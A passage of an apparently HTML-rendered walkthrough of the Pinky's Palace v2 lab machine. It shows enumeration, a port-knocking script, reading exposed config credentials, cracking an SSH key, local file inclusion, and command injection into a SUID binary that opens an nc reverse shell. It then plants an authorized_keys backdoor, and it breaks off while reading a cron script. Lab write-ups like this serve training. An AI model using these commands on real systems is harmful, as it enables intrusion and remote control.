<span class="o">==&gt;</span> DIRECTORY: http://pinkydb/wordpress/ 
<span class="o">==&gt;</span> DIRECTORY: http://pinkydb/wp-admin/   
<span class="o">==&gt;</span> DIRECTORY: http://pinkydb/wp-content/  
<span class="o">==&gt;</span> DIRECTORY: http://pinkydb/wp-includes/ 
+ http://pinkydb/xmlrpc.php <span class="o">(</span>CODE:405|SIZE:42<span class="o">)</span>
...
</code></pre></div></div>

<p>At the previous exit, we can see a directory called secret, so we access to it.</p>

<p><img src="/assets/images/pinkysv2/screenshot-2.png" alt="" /></p>

<p>This contains three numbers as a sequence of ports and the word pinkydb.</p>

<p><img src="/assets/images/pinkysv2/screenshot-3.png" alt="" /></p>

<p>There is a technique called “Port Knoking” that allows us to open ports, when connecting to a series of ports in the correct order, I wrote a python script to discover the correct order of the sequence, in such a way it was possible to open the filtered ports found with nmap.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">itertools</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"192.168.179.178"</span>
<span class="n">ports</span> <span class="o">=</span> <span class="p">[</span><span class="mi">8890</span><span class="p">,</span> <span class="mi">7000</span><span class="p">,</span> <span class="mi">666</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">connection</span><span class="p">(</span><span class="n">port</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="n">permutation</span> <span class="o">=</span> <span class="n">itertools</span><span class="p">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">ports</span><span class="p">)</span>

<span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">permutation</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">f"Trying  =&gt; </span><span class="si">{</span><span class="n">port</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span><span class="mi">5</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">port</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span><span class="mi">5</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">port</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span><span class="mi">5</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">connection</span><span class="p">(</span><span class="n">port</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">connection</span><span class="p">(</span><span class="n">port</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="n">connection</span><span class="p">(</span><span class="n">port</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">connection</span><span class="p">(</span><span class="mi">31337</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="se">\n</span><span class="s">Success =&gt; </span><span class="si">{</span><span class="n">port</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span><span class="mi">5</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">port</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span><span class="mi">5</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">port</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span><span class="mi">5</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>We run the script, and find the correct sequence to open the ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 knock.py            
Trying  <span class="o">=&gt;</span>  8890  7000   666
Trying  <span class="o">=&gt;</span>  8890   666  7000
Trying  <span class="o">=&gt;</span>  7000  8890   666
Trying  <span class="o">=&gt;</span>  7000   666  8890

Success <span class="o">=&gt;</span>  7000   666  8890
</code></pre></div></div>

<p>We can check if the filtered ports are open simply performing a re-scan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T4</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p4655</span>,7654,31337 192.168.179.178
...
PORT      STATE SERVICE
4655/tcp  open  unknown
7654/tcp  open  unknown
31337/tcp open  Elite
...
</code></pre></div></div>

<p>Now, we can discover the service and version of the available ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-A</span> <span class="nt">-p4655</span>,7654,31337 192.168.179.178
...
PORT      STATE SERVICE VERSION
4655/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 <span class="o">(</span>RSA<span class="o">)</span>
|   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 <span class="o">(</span>ED25519<span class="o">)</span>
7654/tcp  open  http    nginx 1.10.3
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3
|_http-title: 403 Forbidden
31337/tcp open  Elite?
| fingerprint-strings:
|   GenericLines, NULL:
|     <span class="o">[</span>+] Welcome to The Daemon <span class="o">[</span>+]
|     This is soon to be our backdoor
|     into Pinky<span class="s1">'s Palace.
|   GetRequest:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky'</span>s Palace.
|     HTTP/1.0
|   SIPOptions:
|     <span class="o">[</span>+] Welcome to The Daemon <span class="o">[</span>+]
|     This is soon to be our backdoor
|     into Pinky<span class="s1">'s Palace.
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: &lt;sip:nm@nm&gt;;tag=root
|     &lt;sip:nm2@nm2&gt;
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: &lt;sip:nm@nm&gt;
|_    Accept: application/sdp
...
</span></code></pre></div></div>

<h3 id="enumeration-on-port-7654">Enumeration on port 7654</h3>

<p>The web service that runs on port 7654 contains a login form, but we don’t know the credentials.</p>

<p><img src="/assets/images/pinkysv2/screenshot-4.png" alt="" /></p>

<p><img src="/assets/images/pinkysv2/screenshot-5.png" alt="" /></p>

<p>I ran gobuster in order to discover any interesting information, but nothing.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://pinkydb:7654 <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span> <span class="nt">-x</span> php,html
...
http://pinkydb:7654/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 134]
http://pinkydb:7654/login.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 545]
http://pinkydb:7654/config.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]
...
</code></pre></div></div>

<p>Then, I ran gobuster again this time specifying the IP address instead of the host name.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.178:7654 <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span>
...
http://192.168.179.178:7654/apache               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 185] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.178:7654/apache/]
http://192.168.179.178:7654/nginx                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 185] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.178:7654/nginx/] 
...
</code></pre></div></div>

<p>In this ocasion, two directories were found, then a simple enumeration with dirb under the apache directory discovered the same content as on port 80.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirb http://192.168.179.178:7654/apache/ <span class="nt">-r</span>
...
<span class="nt">----</span> Scanning URL: http://192.168.179.178:7654/apache/ <span class="nt">----</span>
+ http://192.168.179.178:7654/apache/.htaccess <span class="o">(</span>CODE:200|SIZE:235<span class="o">)</span> 
+ http://192.168.179.178:7654/apache/index.php <span class="o">(</span>CODE:200|SIZE:418<span class="o">)</span>
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.178:7654/apache/secret/       
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.178:7654/apache/wordpress/  
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.178:7654/apache/wp-admin/    
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.178:7654/apache/wp-content/  
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.178:7654/apache/wp-includes/ 
+ http://192.168.179.178:7654/apache/xmlrpc.php <span class="o">(</span>CODE:200|SIZE:3065<span class="o">)</span>
</code></pre></div></div>

<p>When verifying the resources found, I could see that it is possible to download the content web.</p>

<p><img src="/assets/images/pinkysv2/screenshot-6.png" alt="" /></p>

<p>We can use curl to download and read the wordpress configuration file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.178:7654/apache/wp-config.php 
...
/<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'pwp_db'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database username <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'pinkywp'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database password <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'pinkydbpass_wp'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> Database Charset to use <span class="k">in </span>creating database tables. <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_CHARSET'</span>, <span class="s1">'utf8mb4'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> The Database Collate type. Don<span class="s1">'t change this if in doubt. */
define('</span>DB_COLLATE<span class="s1">', '');
...
</span></code></pre></div></div>

<p>Under the nginx directory, the php files of the login form that run on port 7654 was found.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirb http://192.168.179.178:7654/nginx/pinkydb/
...
<span class="nt">----</span> Scanning URL: http://192.168.179.178:7654/nginx/pinkydb/ <span class="nt">----</span>
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.178:7654/nginx/pinkydb/html/    
                                                                          
<span class="nt">----</span> Entering directory: http://192.168.179.178:7654/nginx/pinkydb/html/ <span class="nt">----</span>
+ http://192.168.179.178:7654/nginx/pinkydb/html/index.php <span class="o">(</span>CODE:200|SIZE:134<span class="o">)</span>
...
</code></pre></div></div>

<p>We list the connection to the database.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.178:7654/nginx/pinkydb/html/config.php
&lt;?php
        define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>
        define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'secretpinkdbuser'</span><span class="o">)</span><span class="p">;</span>
        define<span class="o">(</span><span class="s1">'DB_PASS'</span>, <span class="s1">'pinkyssecretdbpass'</span><span class="o">)</span><span class="p">;</span>
        define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'secretsdb'</span><span class="o">)</span><span class="p">;</span>
        <span class="nv">$conn</span> <span class="o">=</span> mysqli_connect<span class="o">(</span>DB_HOST,DB_USER,DB_PASS,DB_NAME<span class="o">)</span><span class="p">;</span>
?&gt;
</code></pre></div></div>

<p>listing the login.php file, we see a link to a page that redirects a user when they have successfully logged in.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.178:7654/nginx/pinkydb/html/login.php | <span class="nb">head</span> <span class="nt">-20</span>
&lt;?php
        include<span class="o">(</span><span class="s2">"config.php"</span><span class="o">)</span><span class="p">;</span>
        <span class="nv">$USER</span> <span class="o">=</span> mysqli_real_escape_string<span class="o">(</span><span class="nv">$conn</span>,<span class="nv">$_POST</span><span class="o">[</span><span class="s1">'user'</span><span class="o">])</span><span class="p">;</span>
        <span class="nv">$PASS</span> <span class="o">=</span> mysqli_real_escape_string<span class="o">(</span><span class="nv">$conn</span>,<span class="nv">$_POST</span><span class="o">[</span><span class="s1">'pass'</span><span class="o">])</span><span class="p">;</span>
        <span class="nv">$PASS</span> <span class="o">=</span> md5<span class="o">(</span><span class="nv">$PASS</span><span class="o">)</span><span class="p">;</span>
        <span class="nv">$statement</span> <span class="o">=</span> <span class="s2">"SELECT id FROM users WHERE username = '</span><span class="nv">$USER</span><span class="s2">' and password = '</span><span class="nv">$PASS</span><span class="s2">'"</span><span class="p">;</span>
        <span class="nv">$result</span> <span class="o">=</span> mysqli_query<span class="o">(</span><span class="nv">$conn</span>,<span class="nv">$statement</span><span class="o">)</span><span class="p">;</span>
        <span class="nv">$row</span> <span class="o">=</span> mysqli_fetch_array<span class="o">(</span><span class="nv">$result</span>,MYSQLI_ASSOC<span class="o">)</span><span class="p">;</span>
        <span class="nv">$active</span> <span class="o">=</span> <span class="nv">$row</span><span class="o">[</span><span class="s1">'active'</span><span class="o">]</span><span class="p">;</span>
        <span class="nv">$count</span> <span class="o">=</span> mysqli_num_rows<span class="o">(</span><span class="nv">$result</span><span class="o">)</span><span class="p">;</span>

        <span class="k">if</span> <span class="o">(</span><span class="nv">$count</span> <span class="o">==</span> 1<span class="o">)</span>
        <span class="o">{</span>
                header<span class="o">(</span><span class="s2">"Location: http://pinkydb:7654/pageegap.php?1337=filesselif1001.php"</span><span class="o">)</span><span class="p">;</span>
        <span class="o">}</span>
        <span class="k">else if</span> <span class="o">(</span><span class="nv">$count</span> <span class="o">!=</span> 1<span class="o">)</span>
        <span class="o">{</span>
                <span class="nb">echo</span> <span class="s2">"&lt;center&gt;Invalid Username or Password!&lt;/center&gt;"</span><span class="p">;</span>
        <span class="o">}</span>
</code></pre></div></div>

<p>This contains a link to an rsa key and a note.</p>

<p><img src="/assets/images/pinkysv2/screenshot-7.png" alt="" /></p>

<p>We first download the private key to the attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget http://pinkydb:7654/credentialsdir1425364865/id_rsa
</code></pre></div></div>

<p>We review the note, it contains the username for the rsa key.</p>

<p><img src="/assets/images/pinkysv2/screenshot-8.png" alt="" /></p>

<p>Then, we convert the private key to a format that john can crack it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>/usr/share/john/ssh2john.py id_rsa <span class="o">&gt;</span> ssh.hash

root@kali:~<span class="nv">$ </span>john ssh.has <span class="nt">--wordlist</span><span class="o">=</span>rockyou.txt <span class="nt">--format</span><span class="o">=</span>SSH
...
secretz101       <span class="o">(</span>id_rsa<span class="o">)</span>
</code></pre></div></div>

<p>Now, That the password is found, we can log in via SSH to the target machine.</p>

<p>To testing the parameter <strong>1337</strong>, was found that it is vulnerable to Local File Inclusion.</p>

<p><img src="/assets/images/pinkysv2/screenshot-9.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="access-via-ssh">Access via SSH</h3>

<p>Before logging in, we need to grant the following permissions to the RSA private key.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">chmod </span>400 id_rsa
</code></pre></div></div>

<p>We access via SSH to the target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh stefano@192.168.179.178 <span class="nt">-p</span> 4655 <span class="nt">-i</span> id_rsa    
Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: 
Linux Pinkys-Palace 4.9.0-4-amd64 <span class="c">#1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar 17 21:18:01 2018 from 172.19.19.2
stefano@Pinkys-Palace:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>stefano<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>stefano<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>stefano<span class="o">)</span>
</code></pre></div></div>

<p>In the history file, from user stefano, there is a binary file that looks interesting.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stefano@Pinkys-Palace:~<span class="nv">$ </span><span class="nb">cat</span> .bash_history
...
<span class="nb">cd</span> /usr/local/bin
<span class="nb">ls
ls</span> <span class="nt">-al</span>
<span class="nb">cat </span>backup.sh
...
</code></pre></div></div>

<p>By listing the SUID binaries, was found the following binary in the stefano’s home directory, we will use it to escalate privileges as the user pinky.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stefano@Pinkys-Palace:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null 
<span class="nt">-rwsr----x</span> 1 pinky www-data 13384 Mar 16  2018 /home/stefano/tools/qsub
...
</code></pre></div></div>

<p>We execute the binary and it seems that it requires a message as input, in the same directory as the binary there is a note specifying that the program was made to send messages.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stefano@Pinkys-Palace:~<span class="nv">$ </span>/home/stefano/tools/qsub 
/home/stefano/tools/qsub &lt;Message&gt;
stefano@Pinkys-Palace:~<span class="nv">$ </span><span class="nb">cat </span>tools/note.txt 
Pinky made me this program so I can easily send messages to him.
</code></pre></div></div>

<p>We cannot analyze the binary file on the victim machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stefano@Pinkys-Palace:~<span class="nv">$ </span>strings /home/stefano/tools/qsub 
strings: /home/stefano/tools/qsub: Permission denied
</code></pre></div></div>

<p>So the best thing we can do is download it to the attacking machine, to do this I will use the discovered Local File Inclusion vulnerability.</p>

<p><img src="/assets/images/pinkysv2/screenshot-10.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget http://pinkydb:7654/pageegap.php?1337<span class="o">=</span>/home/stefano/tools/qsub <span class="nt">-O</span> qsub
</code></pre></div></div>

<p>We give it execution privileges, using the strings command we see that the text displayed by echo is added to a file located in the pinky’s home directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">chmod</span> +x qsub
root@kali:~<span class="nv">$ </span>strings qsub
...
/bin/echo %s <span class="o">&gt;&gt;</span> /home/pinky/messages/stefano_msg.txt  
%s &lt;Message&gt;                                           
TERM                                              
<span class="o">[</span>+] Input Password:                         
Bad hacker! Go away!                 
<span class="o">[</span>+] Welcome to Question Submit!    
<span class="o">[!]</span> Incorrect Password!
...
</code></pre></div></div>

<p>When analyzing the binary with ltrace we can see that the value of the environment variable <strong>$TERM</strong> is used to compare with the password entered by the user, if they are the same, the message is sent otherwise it gives an error.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ltrace ./qsub <span class="nb">test
</span>getenv<span class="o">(</span><span class="s2">"TERM"</span><span class="o">)</span>                                                                                       <span class="o">=</span> <span class="s2">"screen"</span>
<span class="nb">printf</span><span class="o">(</span><span class="s2">"[+] Input Password: "</span><span class="o">)</span>                                                                       <span class="o">=</span> 20
__isoc99_scanf<span class="o">(</span>0x55bf60600cb5, 0x7ffd0b68dcd0, 0, 0[+] Input Password: password
<span class="o">)</span>                                                 <span class="o">=</span> 1
strlen<span class="o">(</span><span class="s2">"password"</span><span class="o">)</span>                                                                                   <span class="o">=</span> 8
strcmp<span class="o">(</span><span class="s2">"password"</span>, <span class="s2">"screen"</span><span class="o">)</span>                                                                         <span class="o">=</span> <span class="nt">-3</span>
puts<span class="o">(</span><span class="s2">"[!] Incorrect Password!"</span><span class="o">[!]</span> Incorrect Password!
<span class="o">)</span>                                                                      <span class="o">=</span> 24
<span class="nb">exit</span><span class="o">(</span>0 &lt;no <span class="k">return</span> ...&gt;
+++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ltrace ./qsub <span class="nb">test
</span>getenv<span class="o">(</span><span class="s2">"TERM"</span><span class="o">)</span>                                                                                       <span class="o">=</span> <span class="s2">"screen"</span>
<span class="nb">printf</span><span class="o">(</span><span class="s2">"[+] Input Password: "</span><span class="o">)</span>                                                                       <span class="o">=</span> 20
__isoc99_scanf<span class="o">(</span>0x55b9ba000cb5, 0x7fffbc059980, 0, 0[+] Input Password: screen
<span class="o">)</span>                                                 <span class="o">=</span> 1
strlen<span class="o">(</span><span class="s2">"screen"</span><span class="o">)</span>                                                                                     <span class="o">=</span> 6
strcmp<span class="o">(</span><span class="s2">"screen"</span>, <span class="s2">"screen"</span><span class="o">)</span>                                                                           <span class="o">=</span> 0
<span class="nb">printf</span><span class="o">(</span><span class="s2">"[+] Welcome to Question Submit!"</span><span class="o">)</span>                                                            <span class="o">=</span> 31
getegid<span class="o">()</span>                                                                                            <span class="o">=</span> 0
geteuid<span class="o">()</span>                                                                                            <span class="o">=</span> 0
setresgid<span class="o">(</span>0, 0, 0, 0<span class="o">)</span>                                                                                <span class="o">=</span> 0
setresuid<span class="o">(</span>0, 0, 0, 0<span class="o">)</span>                                                                                <span class="o">=</span> 0
asprintf<span class="o">(</span>0x7fffbc059958, 0x55b9ba000c58, 0x7fffbc05b765, 0<span class="o">)</span>                                          <span class="o">=</span> 54
system<span class="o">(</span><span class="s2">"/bin/echo test &gt;&gt; /home/pinky/me"</span>...sh: 1: cannot create /home/pinky/messages/stefano_msg.txt: Directory nonexistent
 &lt;no <span class="k">return</span> ...&gt;
<span class="nt">---</span> SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> <span class="nt">---</span>
&lt;... system resumed&gt; <span class="o">)</span>                                                                               <span class="o">=</span> 512
<span class="o">[</span>+] Welcome to Question Submit!+++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
</code></pre></div></div>

<p>Now that we know how the binary works, we first need to start a netcat listener on port 443 in my case, and execute the following command on the target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stefano@Pinkys-Palace:~<span class="nv">$ </span>/home/stefano/tools/qsub <span class="s2">";nc 192.168.179.1 443 -e /bin/bash"</span>
<span class="o">[</span>+] Input Password: screen
</code></pre></div></div>

<p>We have a shell with pinky user privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.178] 51210
script <span class="nt">-qc</span> /bin/bash /dev/null
pinky@Pinkys-Palace:~<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>pinky<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>stefano<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>stefano<span class="o">)</span>
pinky@Pinkys-Palace:~<span class="err">$</span>
</code></pre></div></div>

<p>Since we don’t have the necessary privileges to edit the backup file, one way to bypass this is accessing through SSH.</p>

<p>We generate a pair of RSA keys.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh-keygen <span class="nt">-P</span> <span class="s2">"pinkys123"</span> <span class="nt">-f</span> pinky_rsa
</code></pre></div></div>

<p>On the target machine we create the .ssh directory and in it we create the <strong>authorized_keys</strong> file that contains the public key, and grant all privileges to the owner of the file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pinky@Pinkys-Palace:/home/pinky<span class="nv">$ </span><span class="nb">mkdir</span> .ssh
<span class="nb">mkdir</span> .ssh
pinky@Pinkys-Palace:/home/pinky<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCXuRltyrlhrthbnt7stOvfbRJ7aTQhbZ2ps/NMT+PMYBKacQOQ3QsLqTCIZ7KfKHp2029+k/8FviS58Zoz6omP6RYhJ8E6Ayt0gUt0e5LKTKTocrvk4dsmK9Qo6EvhlBDet11yabRuXKrH1btxOIfyb8F06lQDodvefg/BBMIk5wwAKVO5/m5kK2uT5wShEZR0bbUdsBEXLMLvPZv9wbrcDDSX9xBzHkYr+adddqqXF+faqt6hfvBri03fEv5Kyb/Txwj7h6PhY5fq5mFdze4XaL0AAY58HLju6cZlQ6P8hIKsms7a5lh7TDo+tfudULt+fK+ZyoEzVXoaRLDlq1CPrioujhs8OTn6mB1tLNNjw2LJW0z/AJDs4evbOFkYmaB6C8QL2TdHxqrZNP4xZ3F7ao8QG6hfrnnyQoLrhnSnH8SQRC4/YyfudiFlph4sVbSpHiQq/byHwAuG42tkT5QEun+/tW1GeYkNgGrC58tRXzvQHLklFniWvvNl7qpEtK8='</span> <span class="o">&gt;</span> .ssh/authorized_keys
<span class="nv">GrC58tRXzvQHLklFniWvvNl7qpEtK8</span><span class="o">=</span><span class="s1">' &gt; .ssh/authorized_keyswAuG42tkT5QEun+/tW1GeYkNgG
pinky@Pinkys-Palace:/home/pinky$ chmod 700 .ssh/authorized_keys
chmod 700 .ssh/authorized_keys
pinky@Pinkys-Palace:/home/pinky$
</span></code></pre></div></div>

<p>We access via SSH as shown below.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh pinky@192.168.179.178 <span class="nt">-i</span> pinky_rsa <span class="nt">-p</span> 4655
Enter passphrase <span class="k">for </span>key <span class="s1">'pinky_rsa'</span>: 
Linux Pinkys-Palace 4.9.0-4-amd64 <span class="c">#1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
pinky@Pinkys-Palace:~<span class="err">$</span>
</code></pre></div></div>

<p>Now, we can edit the backup file, this is a script that is being executed by a cron job.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pinky@Pinkys-Palace:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /usr/local/bin/backup.sh
<span class="nt">-rwxrwx---</span> 1 demon pinky 113 Mar 17  2018 /usr/local/bin/backup.sh
pinky@Pinkys-Palace:~<span class="nv">$ </span><span class="nb">cat</span> /usr/local/bin/backup.sh 
<span class="c">#!/bin/bash</span>

<span class="nb">rm</span> /home/demon/backups/backup.tar.gz
